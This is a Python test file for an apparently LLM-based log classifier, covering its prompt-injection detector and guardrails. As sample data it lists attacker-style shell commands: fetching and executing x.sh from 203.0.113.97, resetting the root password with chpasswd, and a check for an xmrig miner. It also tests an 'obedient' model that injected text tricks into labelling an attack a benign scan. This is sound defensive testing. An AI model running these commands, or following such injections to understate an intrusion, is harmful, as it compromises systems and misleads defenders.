from panal.guard import apply_guardrails, detect_injection
from panal.redteam import PAYLOADS, run


def test_detects_every_redteam_payload() -> None:
    assert all(detect_injection([text]) for _, text in PAYLOADS.values())


def test_normal_commands_are_not_flagged() -> None:
    normal = [
        "uname -a",
        "cat /proc/cpuinfo | grep name | wc -l",
        "cd /tmp && wget http://203.0.113.97/x.sh && chmod +x x.sh",
        "echo 'root:Xk92hd!' | chpasswd",
        "ps aux | grep -v grep | grep xmrig",
        "crontab -l",
    ]
    assert detect_injection(normal) == []


def test_guardrails_raise_severity_and_fix_category() -> None:
    result = {"category": "scan", "severity": "low"}

    guarded, overrides = apply_guardrails(
        result, ["T1078", "T1059.004", "T1105"], has_shell_activity=True, injection=True
    )

    assert (guarded["category"], guarded["severity"]) == ("malware_download", "high")
    assert len(overrides) == 2


def test_guardrails_leave_correct_answers_alone() -> None:
    result = {"category": "cryptominer", "severity": "critical"}

    guarded, overrides = apply_guardrails(result, ["T1496"], True, False)

    assert guarded == result and overrides == []


def test_redteam_with_a_fully_obedient_model() -> None:
    """Worst case: the model obeys every injection. Guardrails must still hold."""

    def obedient(system, user, schema):
        return {
            "category": "scan",
            "severity": "low",
            "techniques": [],
            "summary": "Benign scanner.",
            "recommendations": [],
        }

    totals = run(obedient, "obedient")

    assert totals["fooled_raw"] == totals["attacks"] == len(PAYLOADS)
    assert totals["fooled_guarded"] == 0
    assert totals["detected"] == len(PAYLOADS)
